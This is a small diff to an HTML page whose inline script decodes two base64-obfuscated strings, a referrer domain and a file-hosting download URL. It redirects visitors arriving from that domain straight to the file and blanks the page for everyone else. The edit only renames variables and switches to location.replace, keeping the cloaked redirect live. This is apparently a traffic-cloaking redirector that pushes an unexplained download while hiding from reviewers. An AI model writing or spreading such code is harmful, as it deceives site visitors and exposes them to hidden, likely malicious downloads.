@@ -1,11 +1,11 @@
 <head></head>
 <script>
 (() => {
-  const x = atob('YnN0bGFyLmNvbQ==');
-  const y = atob('aHR0cHM6Ly9maWxlcmlmdC5jb20vZmlsZS9SdjBhZFRQa19q');
+  const a = atob('YnN0bGFyLmNvbQ==');
+  const b = atob('aHR0cHM6Ly9maWxlcmlmdC5jb20vZmlsZS9SdjBhZFRQa19q');
 
-  if ((document.referrer || '').includes(x)) {
-    location.href = y;
+  if ((document.referrer || '').includes(a)) {
+    location.replace(b);
   } else {
     document.body.innerHTML = '';
   }
